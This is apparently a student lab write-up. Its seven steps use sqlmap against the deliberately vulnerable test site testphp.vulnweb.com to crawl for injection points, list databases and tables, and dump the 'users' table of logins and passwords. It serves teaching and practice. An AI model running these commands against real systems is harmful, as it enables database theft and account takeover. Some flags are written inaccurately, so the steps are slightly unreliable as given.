To perform the attack I have used 'Kali Linux' as my host OS and used a built in tool 'SqlMap' to find the vulnerabilities.

STEP 1 : I have used "Acuart" to conduct the attack, initilaiiy I crawled the website using the following command
         "sqlmap -u http://testphp.vulnweb.com/ --crawl 2"

STEP 2 : This crawls the website and finds the possible vulnerabilities present in the code, it then exports these links in the CSV file (uploaded in the folder). 
         Now we can use these entry points to exploit the vulnerability.
         
STEP 3 : Checking the exported file we can see the following entry 
         "http://testphp.vulnweb.com/listproducts.php?cat=1,GET,cat,BETU,"
         we will use the "cat=1" to exploit it

STEP 4 : Entering the command "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs". Shows us the list of all databases available.

STEP 5 : Now since we have acquired the name of the database, we can use this to check all the tables present in the database by entering
         "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart tables"

STEP 6 : As a result of above command, all of the tables are now visible to us. Well use the "users" table to find the users login and password

STEP 7 : Entering the command "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump". Gives us the details of all users 
         present in the database. We can use this information to login.
